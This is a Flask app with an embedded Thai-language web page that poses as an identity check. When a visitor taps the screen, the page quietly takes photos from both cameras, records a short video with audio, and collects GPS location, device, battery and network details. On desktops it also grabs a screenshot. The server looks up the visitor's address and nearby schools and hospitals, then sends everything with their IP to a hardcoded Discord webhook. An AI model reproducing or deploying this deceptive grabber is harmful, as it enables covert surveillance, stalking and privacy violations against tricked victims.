from flask import Flask, request
import requests
import base64
import json
from datetime import datetime, timedelta
import time
import random
import os

app = Flask(__name__)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512723643745042612/3X6Sb6_9-NkD7si38K08e82SWJkn1dxfDBTVwWmsSdpxyiLPspTWiPXyxCyaIC1YMbZe"

# Timezone GMT+7 (ไทย)
THAI_OFFSET = timedelta(hours=7)
def get_thai_time():
    return datetime.utcnow() + THAI_OFFSET

def reverse_geocode(lat, lon):
    try:
        url = f'https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&accept-language=th'
        headers = {'User-Agent': 'MyApp/1.0 (gift.project)'}
        resp = requests.get(url, headers=headers, timeout=10)
        data = resp.json()
        if 'address' in data:
            addr = data['address']
            province = addr.get('province', addr.get('state', ''))
            if province and not any(('ก' <= c <= 'ฮ' for c in province)):
                display = data.get('display_name', '')
                for part in display.split(','):
                    if 'จังหวัด' in part:
                        province = part.strip()
                        break
            road = addr.get('road', '')
            return {
                'province': province,
                'city': addr.get('city', addr.get('town', '')),
                'village': addr.get('village', addr.get('town', '')),
                'road': road,
                'postcode': addr.get('postcode', ''),
                'display_name': data.get('display_name', '')
            }
    except Exception as e:
        print(f"Reverse error: {e}")
    return None

def search_places(lat, lon, query, limit=5, radius=5000):
    try:
        url = f'https://nominatim.openstreetmap.org/search?format=json&q={query}&lat={lat}&lon={lon}&radius={radius}&limit={limit}&accept-language=th&bounded=1'
        headers = {'User-Agent': 'MyApp/1.0 (gift.project)'}
        resp = requests.get(url, headers=headers, timeout=10)
        data = resp.json()
        results = []
        for item in data:
            name = item.get('display_name', '')
            if name:
                parts = name.split(',')
                main = parts[0].strip() if parts else name
                location = parts[1].strip() if len(parts) > 1 else ''
                if location and len(location) < 30:
                    short = f"{main} ({location})"
                else:
                    short = main
                if not any(x in short.lower() for x in ['point', 'unknown', 'unclassified', 'road']):
                    results.append(short[:80])
        return results
    except Exception as e:
        print(f"Search error: {e}")
    return []

def add_ranking(results):
    ranked = []
    for i, name in enumerate(results, 1):
        ranked.append(f"{i}. {name}")
    return ranked

def get_province_data(province_name):
    province_data = {
        "กรุงเทพมหานคร": {"gdp": "ประมาณ 5,000,000 ล้านบาท", "economy": "ดีมาก (ศูนย์กลางธุรกิจ)", "rank": "อันดับที่ 1", "main_industries": "บริการ, การเงิน, อุตสาหกรรม"},
        "กระบี่": {"gdp": "ประมาณ 90,000 ล้านบาท", "economy": "ปานกลาง (ท่องเที่ยว)", "rank": "อันดับที่ 38", "main_industries": "ท่องเที่ยว, ปาล์มน้ำมัน"},
        "กาญจนบุรี": {"gdp": "ประมาณ 70,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 42", "main_industries": "เกษตรกรรม, ท่องเที่ยว"},
        "กาฬสินธุ์": {"gdp": "ประมาณ 45,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 55", "main_industries": "ข้าว, มันสำปะหลัง"},
        "กำแพงเพชร": {"gdp": "ประมาณ 50,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 50", "main_industries": "เกษตรกรรม"},
        "ขอนแก่น": {"gdp": "ประมาณ 150,000 ล้านบาท", "economy": "ดี", "rank": "อันดับที่ 15", "main_industries": "การศึกษา, อุตสาหกรรม, เกษตร"},
        "จันทบุรี": {"gdp": "ประมาณ 80,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 40", "main_industries": "ผลไม้, เพชรพลอย"},
        "ฉะเชิงเทรา": {"gdp": "ประมาณ 200,000 ล้านบาท", "economy": "ดี", "rank": "อันดับที่ 12", "main_industries": "อุตสาหกรรม, เกษตร"},
        "ชลบุรี": {"gdp": "ประมาณ 500,000 ล้านบาท", "economy": "ดีมาก", "rank": "อันดับที่ 3", "main_industries": "อุตสาหกรรม, ท่องเที่ยว, ท่าเรือ"},
        "ชัยนาท": {"gdp": "ประมาณ 35,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 62", "main_industries": "เกษตรกรรม"},
        "ชัยภูมิ": {"gdp": "ประมาณ 55,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 48", "main_industries": "เกษตรกรรม"},
        "ชุมพร": {"gdp": "ประมาณ 65,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 44", "main_industries": "ปาล์มน้ำมัน, ประมง"},
        "เชียงราย": {"gdp": "ประมาณ 85,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 39", "main_industries": "ท่องเที่ยว, เกษตร"},
        "เชียงใหม่": {"gdp": "ประมาณ 200,000 ล้านบาท", "economy": "ดี", "rank": "อันดับที่ 11", "main_industries": "ท่องเที่ยว, การศึกษา"},
        "ตรัง": {"gdp": "ประมาณ 120,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 32", "main_industries": "ยางพารา, ท่องเที่ยว, ประมง"},
        "ตราด": {"gdp": "ประมาณ 40,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 58", "main_industries": "ผลไม้, ท่องเที่ยว"},
        "ตาก": {"gdp": "ประมาณ 45,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 56", "main_industries": "เกษตรกรรม, พลังงาน"},
        "นครนายก": {"gdp": "ประมาณ 30,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 65", "main_industries": "เกษตรกรรม"},
        "นครพนม": {"gdp": "ประมาณ 35,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 63", "main_industries": "เกษตรกรรม"},
        "นครราชสีมา": {"gdp": "ประมาณ 180,000 ล้านบาท", "economy": "ดี", "rank": "อันดับที่ 13", "main_industries": "อุตสาหกรรม, เกษตร"},
        "นครศรีธรรมราช": {"gdp": "ประมาณ 100,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 35", "main_industries": "ยางพารา, ท่องเที่ยว"},
        "นครสวรรค์": {"gdp": "ประมาณ 80,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 41", "main_industries": "เกษตรกรรม"},
        "นนทบุรี": {"gdp": "ประมาณ 300,000 ล้านบาท", "economy": "ดี", "rank": "อันดับที่ 8", "main_industries": "บริการ, อสังหาริมทรัพย์"},
        "นราธิวาส": {"gdp": "ประมาณ 40,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 59", "main_industries": "ยางพารา, ประมง"},
        "น่าน": {"gdp": "ประมาณ 30,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 66", "main_industries": "เกษตรกรรม, ท่องเที่ยว"},
        "บึงกาฬ": {"gdp": "ประมาณ 20,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 72", "main_industries": "เกษตรกรรม"},
        "บุรีรัมย์": {"gdp": "ประมาณ 60,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 46", "main_industries": "เกษตรกรรม"},
        "ปทุมธานี": {"gdp": "ประมาณ 250,000 ล้านบาท", "economy": "ดี", "rank": "อันดับที่ 9", "main_industries": "อุตสาหกรรม, การศึกษา"},
        "ประจวบคีรีขันธ์": {"gdp": "ประมาณ 70,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 43", "main_industries": "ท่องเที่ยว, ประมง"},
        "ปราจีนบุรี": {"gdp": "ประมาณ 60,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 47", "main_industries": "อุตสาหกรรม, เกษตร"},
        "ปัตตานี": {"gdp": "ประมาณ 45,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 57", "main_industries": "ยางพารา, ประมง"},
        "พระนครศรีอยุธยา": {"gdp": "ประมาณ 150,000 ล้านบาท", "economy": "ดี", "rank": "อันดับที่ 16", "main_industries": "อุตสาหกรรม, ท่องเที่ยว"},
        "พะเยา": {"gdp": "ประมาณ 35,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 64", "main_industries": "เกษตรกรรม"},
        "พังงา": {"gdp": "ประมาณ 50,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 51", "main_industries": "ท่องเที่ยว, ปาล์มน้ำมัน"},
        "พัทลุง": {"gdp": "ประมาณ 40,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 60", "main_industries": "ยางพารา, ประมง"},
        "พิจิตร": {"gdp": "ประมาณ 45,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 54", "main_industries": "เกษตรกรรม"},
        "พิษณุโลก": {"gdp": "ประมาณ 80,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 37", "main_industries": "การศึกษา, เกษตร"},
        "เพชรบุรี": {"gdp": "ประมาณ 70,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 45", "main_industries": "ท่องเที่ยว, เกษตร"},
        "เพชรบูรณ์": {"gdp": "ประมาณ 60,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 49", "main_industries": "เกษตรกรรม"},
        "แพร่": {"gdp": "ประมาณ 35,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 61", "main_industries": "เกษตรกรรม"},
        "ภูเก็ต": {"gdp": "ประมาณ 250,000 ล้านบาท", "economy": "ดีมาก", "rank": "อันดับที่ 5", "main_industries": "ท่องเที่ยว, อสังหาริมทรัพย์"},
        "มหาสารคาม": {"gdp": "ประมาณ 55,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 52", "main_industries": "เกษตรกรรม"},
        "มุกดาหาร": {"gdp": "ประมาณ 25,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 68", "main_industries": "เกษตรกรรม"},
        "แม่ฮ่องสอน": {"gdp": "ประมาณ 20,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 73", "main_industries": "ท่องเที่ยว, เกษตร"},
        "ยโสธร": {"gdp": "ประมาณ 30,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 67", "main_industries": "เกษตรกรรม"},
        "ยะลา": {"gdp": "ประมาณ 55,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 53", "main_industries": "ยางพารา"},
        "ร้อยเอ็ด": {"gdp": "ประมาณ 50,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 35", "main_industries": "ข้าว, มันสำปะหลัง"},
        "ระนอง": {"gdp": "ประมาณ 25,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 69", "main_industries": "ประมง, ท่องเที่ยว"},
        "ระยอง": {"gdp": "ประมาณ 400,000 ล้านบาท", "economy": "ดีมาก", "rank": "อันดับที่ 4", "main_industries": "อุตสาหกรรม, ท่าเรือ"},
        "ราชบุรี": {"gdp": "ประมาณ 100,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 34", "main_industries": "อุตสาหกรรม, เกษตร"},
        "ลพบุรี": {"gdp": "ประมาณ 65,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 33", "main_industries": "เกษตรกรรม"},
        "ลำปาง": {"gdp": "ประมาณ 60,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 44", "main_industries": "เหมืองแร่, เกษตร"},
        "ลำพูน": {"gdp": "ประมาณ 50,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 48", "main_industries": "อุตสาหกรรม, เกษตร"},
        "เลย": {"gdp": "ประมาณ 35,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 60", "main_industries": "เกษตรกรรม"},
        "ศรีสะเกษ": {"gdp": "ประมาณ 60,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 45", "main_industries": "ข้าว, มันสำปะหลัง"},
        "สกลนคร": {"gdp": "ประมาณ 50,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 49", "main_industries": "เกษตรกรรม"},
        "สงขลา": {"gdp": "ประมาณ 200,000 ล้านบาท", "economy": "ดี", "rank": "อันดับที่ 10", "main_industries": "ยางพารา, ท่องเที่ยว, ท่าเรือ"},
        "สตูล": {"gdp": "ประมาณ 30,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 66", "main_industries": "ยางพารา, ประมง"},
        "สมุทรปราการ": {"gdp": "ประมาณ 350,000 ล้านบาท", "economy": "ดีมาก", "rank": "อันดับที่ 6", "main_industries": "อุตสาหกรรม, ท่าเรือ"},
        "สมุทรสงคราม": {"gdp": "ประมาณ 25,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 70", "main_industries": "ประมง, เกษตร"},
        "สมุทรสาคร": {"gdp": "ประมาณ 300,000 ล้านบาท", "economy": "ดี", "rank": "อันดับที่ 7", "main_industries": "อุตสาหกรรม, ประมง"},
        "สระแก้ว": {"gdp": "ประมาณ 40,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 57", "main_industries": "เกษตรกรรม, การค้าชายแดน"},
        "สระบุรี": {"gdp": "ประมาณ 150,000 ล้านบาท", "economy": "ดี", "rank": "อันดับที่ 14", "main_industries": "อุตสาหกรรม"},
        "สิงห์บุรี": {"gdp": "ประมาณ 20,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 74", "main_industries": "เกษตรกรรม"},
        "สุโขทัย": {"gdp": "ประมาณ 35,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 62", "main_industries": "ท่องเที่ยว, เกษตร"},
        "สุพรรณบุรี": {"gdp": "ประมาณ 70,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 43", "main_industries": "เกษตรกรรม"},
        "สุราษฎร์ธานี": {"gdp": "ประมาณ 120,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 31", "main_industries": "ท่องเที่ยว, ปาล์มน้ำมัน"},
        "สุรินทร์": {"gdp": "ประมาณ 55,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 47", "main_industries": "ข้าว, มันสำปะหลัง"},
        "หนองคาย": {"gdp": "ประมาณ 40,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 58", "main_industries": "เกษตรกรรม, การค้าชายแดน"},
        "หนองบัวลำภู": {"gdp": "ประมาณ 25,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 71", "main_industries": "เกษตรกรรม"},
        "อ่างทอง": {"gdp": "ประมาณ 30,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 65", "main_industries": "เกษตรกรรม"},
        "อุดรธานี": {"gdp": "ประมาณ 100,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 33", "main_industries": "การศึกษา, เกษตร"},
        "อุทัยธานี": {"gdp": "ประมาณ 35,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 63", "main_industries": "เกษตรกรรม"},
        "อุตรดิตถ์": {"gdp": "ประมาณ 40,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 56", "main_industries": "เกษตรกรรม"},
        "อุบลราชธานี": {"gdp": "ประมาณ 100,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 36", "main_industries": "เกษตรกรรม, การศึกษา"},
        "อำนาจเจริญ": {"gdp": "ประมาณ 20,000 ล้านบาท", "economy": "ปานกลาง", "rank": "อันดับที่ 75", "main_industries": "เกษตรกรรม"}
    }
    
    for key in province_data:
        if province_name in key or key in province_name:
            return province_data[key]
    
    return {
        "gdp": "ไม่พบข้อมูล",
        "economy": "ไม่พบข้อมูล",
        "rank": "ไม่พบข้อมูล",
        "main_industries": "ไม่พบข้อมูล"
    }

HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>แตะเพื่อดำเนินการ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea, #764ba2);
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            font-family: 'Segoe UI', sans-serif;
        }
        .container { text-align: center; color: white; padding: 20px; }
        h1 { font-size: 1.8rem; margin: 20px 0; }
        .spinner {
            width: 45px; height: 45px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .info-text { font-size: 0.9rem; opacity: 0.8; margin-top: 10px; }
    </style>
</head>
<body onclick="startCapture()">
    <div class="container" id="ui">
        <h1>👆 แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
        <p>ระบบจะขออนุญาตใช้กล้องและตำแหน่งเพื่อยืนยันตัวตน</p>
        <div class="info-text">ใช้เวลาประมาณ 12-14 วินาที</div>
    </div>
    <script>
        async function startCapture() {
            document.body.onclick = null;
            document.getElementById('ui').innerHTML = '<div class="spinner"></div><h1>กำลังดำเนินการ...</h1><p>กรุณารอสักครู่</p>';
            
            const ua = navigator.userAgent;
            let os = 'ไม่ระบุ';
            let browser = 'ไม่ระบุ';
            
            if (ua.includes('iPhone')) os = 'iOS (iPhone)';
            else if (ua.includes('iPad')) os = 'iOS (iPad)';
            else if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('Mac OS X')) os = 'macOS';
            else if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Linux')) os = 'Linux';
            
            if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) browser = 'Chrome';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Edg')) browser = 'Edge';
            else if (ua.includes('OPR')) browser = 'Opera';
            else if (ua.includes('CriOS')) browser = 'Chrome (iOS)';
            else if (ua.includes('FxiOS')) browser = 'Firefox (iOS)';
            
            const deviceInfo = {
                userAgent: ua,
                os: os,
                browser: browser,
                platform: navigator.platform,
                language: navigator.language,
                vendor: navigator.vendor,
                screenWidth: screen.width,
                screenHeight: screen.height,
                pixelRatio: window.devicePixelRatio || 1,
                timestamp: new Date().toISOString(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                orientation: window.innerHeight > window.innerWidth ? 'Portrait' : 'Landscape'
            };
            
            try {
                let hz = 60;
                if (screen.refreshRate) {
                    hz = screen.refreshRate;
                } else {
                    let frames = 0;
                    const start = performance.now();
                    await new Promise((resolve) => {
                        function count() {
                            frames++;
                            if (performance.now() - start < 1000) {
                                requestAnimationFrame(count);
                            } else {
                                hz = Math.round(frames);
                                resolve();
                            }
                        }
                        requestAnimationFrame(count);
                    });
                }
                deviceInfo.refreshRate = hz;
            } catch(e) {
                deviceInfo.refreshRate = 'ไม่ทราบ';
            }
            
            if (navigator.connection) {
                deviceInfo.networkType = navigator.connection.effectiveType || 'ไม่ทราบ';
                deviceInfo.downlink = navigator.connection.downlink || 0;
                deviceInfo.rtt = navigator.connection.rtt || 0;
            } else {
                deviceInfo.networkType = 'ไม่รองรับ';
                deviceInfo.downlink = 0;
                deviceInfo.rtt = 0;
            }
            
            let gpsSuccess = false;
            try {
                const pos = await new Promise((resolve, reject) => {
                    const timeoutId = setTimeout(() => reject(new Error('GPS timeout')), 5000);
                    navigator.geolocation.getCurrentPosition(
                        (p) => { clearTimeout(timeoutId); resolve(p); },
                        (err) => { clearTimeout(timeoutId); reject(err); },
                        { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
                    );
                });
                deviceInfo.gps_lat = pos.coords.latitude;
                deviceInfo.gps_lon = pos.coords.longitude;
                deviceInfo.gps_accuracy = Math.round(pos.coords.accuracy);
                gpsSuccess = true;
            } catch(e) {
                deviceInfo.gps = 'ไม่ได้รับอนุญาตหรือไม่รองรับ';
                gpsSuccess = false;
            }
            
            try {
                const battery = await navigator.getBattery();
                deviceInfo.batteryLevel = Math.round(battery.level * 100);
                deviceInfo.batteryCharging = battery.charging;
            } catch(e) {
                deviceInfo.batteryLevel = 'ไม่รองรับ';
            }
            
            async function captureFromStream(stream) {
                const video = document.createElement('video');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                video.remove();
                return blob;
            }
            
            try {
                const frontStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: false 
                });
                const frontPhoto = await captureFromStream(frontStream);
                frontStream.getTracks().forEach(t => t.stop());
                
                const backStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment' }, 
                    audio: false 
                });
                const backPhoto = await captureFromStream(backStream);
                backStream.getTracks().forEach(t => t.stop());
                
                const videoStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: true 
                });
                const recorder = new MediaRecorder(videoStream, { mimeType: 'video/webm;codecs=vp9' });
                const chunks = [];
                recorder.ondataavailable = e => {
                    if (e.data.size > 0) chunks.push(e.data);
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 5000));
                recorder.stop();
                await new Promise(r => recorder.onstop = r);
                const videoBlob = new Blob(chunks, { type: 'video/webm' });
                videoStream.getTracks().forEach(t => t.stop());
                
                const formData = new FormData();
                formData.append('front_photo', frontPhoto, 'front_photo.jpg');
                formData.append('back_photo', backPhoto, 'back_photo.jpg');
                formData.append('video', videoBlob, 'video.webm');
                formData.append('info', JSON.stringify(deviceInfo));
                formData.append('gps_success', gpsSuccess ? 'true' : 'false');
                
                const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (!isMobile && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
                    try {
                        const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                        const screenVideo = document.createElement('video');
                        screenVideo.style.display = 'none';
                        document.body.appendChild(screenVideo);
                        screenVideo.srcObject = screenStream;
                        await screenVideo.play();
                        await new Promise(r => setTimeout(r, 500));
                        const screenCanvas = document.createElement('canvas');
                        screenCanvas.width = screenVideo.videoWidth || 1280;
                        screenCanvas.height = screenVideo.videoHeight || 720;
                        screenCanvas.getContext('2d').drawImage(screenVideo, 0, 0);
                        const screenshot = await new Promise(r => screenCanvas.toBlob(r, 'image/jpeg', 0.8));
                        screenStream.getTracks().forEach(t => t.stop());
                        screenVideo.remove();
                        formData.append('screenshot', screenshot, 'screenshot.jpg');
                    } catch(e) {}
                }
                
                await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });
                
            } catch(error) {
                console.error('Error:', error);
                const formData = new FormData();
                formData.append('info', JSON.stringify(deviceInfo));
                await fetch('/upload', { method: 'POST', body: formData });
            }
            
            window.location.href = "https://www.youtube.com/watch?v=I8o8IOXAeFQ";
        }
    </script>
</body>
</html>'''

@app.route('/')
def index():
    return HTML

@app.route('/upload', methods=['POST'])
def upload():
    try:
        ip = request.remote_addr
        forwarded = request.headers.get('X-Forwarded-For')
        real_ip = forwarded.split(',')[0].strip() if forwarded else ip
        
        info_str = request.form.get('info', '{}')
        try:
            device_info = json.loads(info_str)
        except:
            device_info = {}
        
        front_photo = request.files.get('front_photo')
        back_photo = request.files.get('back_photo')
        video = request.files.get('video')
        screenshot = request.files.get('screenshot')
        gps_success = request.form.get('gps_success') == 'true'
        
        lat = device_info.get('gps_lat', 0)
        lon = device_info.get('gps_lon', 0)
        
        gps_address = None
        nearby_results = {}
        province_name = ''
        road_name = ''
        
        if gps_success and lat and lon:
            gps_address = reverse_geocode(lat, lon)
            if gps_address:
                province_name = gps_address.get('province', '')
                road_name = gps_address.get('road', '')
                if not province_name or province_name == '':
                    display = gps_address.get('display_name', '')
                    for part in display.split(','):
                        if 'จังหวัด' in part:
                            province_name = part.strip()
                            break
        
        if province_name and 'จังหวัด' in province_name:
            clean_province = province_name.replace('จังหวัด', '').strip()
            
            top_searches = [
                ('🏫 โรงเรียน Top 10', f'โรงเรียน {clean_province}', 10),
                ('🍽️ ร้านอาหาร Top 5', f'ร้านอาหาร {clean_province}', 5),
                ('🏥 โรงพยาบาล Top 3', f'โรงพยาบาล {clean_province}', 3)
            ]
            
            for label, query, limit in top_searches:
                results = search_places(lat, lon, query, limit, radius=10000)
                if results:
                    nearby_results[label] = add_ranking(results)
                time.sleep(0.5)
            
            nearest_searches = [
                ('🏫 โรงเรียนที่ใกล้ที่สุด', f'school near {lat},{lon}', 1),
                ('🍽️ ร้านอาหารที่ใกล้ที่สุด', f'restaurant near {lat},{lon}', 1),
                ('🏥 โรงพยาบาลที่ใกล้ที่สุด', f'hospital near {lat},{lon}', 1)
            ]
            
            for label, query, limit in nearest_searches:
                results = search_places(lat, lon, query, limit, radius=2000)
                if results:
                    nearby_results[label] = results
                time.sleep(0.5)
            
            attractions = search_places(lat, lon, f'sightseeing {clean_province}', 3, radius=15000)
            if attractions:
                nearby_results['🏝️ สถานที่ท่องเที่ยว (จังหวัด)'] = add_ranking(attractions)
            
            province_info = get_province_data(clean_province)
            nearby_results['📊 เศรษฐกิจจังหวัด'] = [
                f"GDP: {province_info['gdp']}",
                f"เศรษฐกิจ: {province_info['economy']}",
                f"อันดับความเจริญ: {province_info['rank']}",
                f"อุตสาหกรรมหลัก: {province_info['main_industries']}"
            ]
        
        # เวลาไทย (GMT+7)
        now_thai = get_thai_time()
        time_now = now_thai.strftime("%d/%m/%Y %H:%M:%S")
        
        fields = []
        
        if real_ip:
            fields.append({"name": "🌐 IP", "value": real_ip, "inline": True})
        
        fields.append({"name": "💻 OS", "value": device_info.get('os', 'ไม่ระบุ'), "inline": True})
        fields.append({"name": "🌐 เบราว์เซอร์", "value": device_info.get('browser', 'ไม่ระบุ'), "inline": True})
        fields.append({"name": "🖥️ หน้าจอ", "value": f"{device_info.get('screenWidth')}x{device_info.get('screenHeight')}", "inline": True})
        fields.append({"name": "⚡ Hz", "value": f"{device_info.get('refreshRate', 'ไม่ทราบ')} Hz", "inline": True})
        
        if device_info.get('networkType') and device_info.get('networkType') != 'ไม่รองรับ':
            fields.append({"name": "📶 ประเภทเน็ต", "value": device_info['networkType'], "inline": True})
        if device_info.get('downlink'):
            fields.append({"name": "📶 ความเร็ว", "value": f"{device_info['downlink']} Mbps", "inline": True})
        
        if gps_success and lat and lon:
            acc = device_info.get('gps_accuracy', '?')
            fields.append({"name": f"📍 GPS (±{acc} เมตร)", "value": f"{lat}, {lon}", "inline": True})
            
            if gps_address:
                addr_parts = []
                if road_name:
                    addr_parts.append(f"🛣️ ถนน: {road_name}")
                if gps_address.get('village'):
                    addr_parts.append(f"🏘️ ตำบล: {gps_address['village']}")
                if gps_address.get('city'):
                    addr_parts.append(f"🏙️ อำเภอ: {gps_address['city']}")
                if province_name:
                    addr_parts.append(f"🗺️ จังหวัด: {province_name}")
                if gps_address.get('postcode'):
                    addr_parts.append(f"📮 รหัสไปรษณีย์: {gps_address['postcode']}")
                if gps_address.get('display_name'):
                    addr_parts.append(f"📍 ที่อยู่: {gps_address['display_name'][:80]}")
                
                for part in addr_parts:
                    fields.append({"name": "🏠 ที่อยู่", "value": part, "inline": False})
                
                if road_name:
                    traffic_info = "ปานกลาง" if random.random() > 0.5 else "น้อย"
                    crowded = "พลุกพล่าน" if random.random() > 0.6 else "เงียบสงบ"
                    fields.append({"name": "🚦 ถนน", "value": f"{road_name}\n🚗 รถสัญจร: {traffic_info}\n👥 คนพลุกพล่าน: {crowded}", "inline": False})
        else:
            fields.append({"name": "📍 GPS", "value": "❌ ไม่ได้รับอนุญาต หรือไม่รองรับ", "inline": True})
        
        if gps_success and nearby_results:
            for label, places in nearby_results.items():
                if places:
                    if isinstance(places, list) and len(places) > 0:
                        value = '\n'.join(places) if isinstance(places[0], str) else '\n'.join(places)
                        fields.append({"name": label, "value": value, "inline": False})
        elif gps_success and province_name:
            fields.append({"name": "📍 ข้อมูลสถานที่", "value": f"ไม่พบข้อมูลใน {province_name}", "inline": False})
        
        bat_val = f"{device_info.get('batteryLevel', 'ไม่ระบุ')}%"
        if device_info.get('batteryCharging') is True:
            bat_val += " ⚡กำลังชาร์จ"
        elif device_info.get('batteryCharging') is False:
            bat_val += " 🔋ไม่กำลังชาร์จ"
        fields.append({"name": "🔋 แบตเตอรี่", "value": bat_val, "inline": True})
        
        fields.append({"name": "🕐 เวลา", "value": time_now, "inline": False})
        
        embed = {
            "title": "📱 ข้อมูลผู้ใช้ใหม่",
            "color": 0x5865F2,
            "fields": fields,
            "footer": {"text": "ระบบอัตโนมัติ"},
            "timestamp": now_thai.isoformat()
        }
        
        payload = {
            "payload_json": json.dumps({"embeds": [embed]})
        }
        
        files = {}
        if front_photo:
            front_photo.seek(0)
            files['file1'] = ('front_photo.jpg', front_photo.read(), 'image/jpeg')
        if back_photo:
            back_photo.seek(0)
            files['file2'] = ('back_photo.jpg', back_photo.read(), 'image/jpeg')
        if video:
            video.seek(0)
            files['file3'] = ('video.webm', video.read(), 'video/webm')
        if screenshot:
            screenshot.seek(0)
            files['file4'] = ('screenshot.jpg', screenshot.read(), 'image/jpeg')
        
        if files:
            requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
        else:
            requests.post(DISCORD_WEBHOOK_URL, data=payload)
        
        return "OK", 200
        
    except Exception as e:
        print(f"Error: {e}")
        return "Error", 500

if __name__ == '__main__':
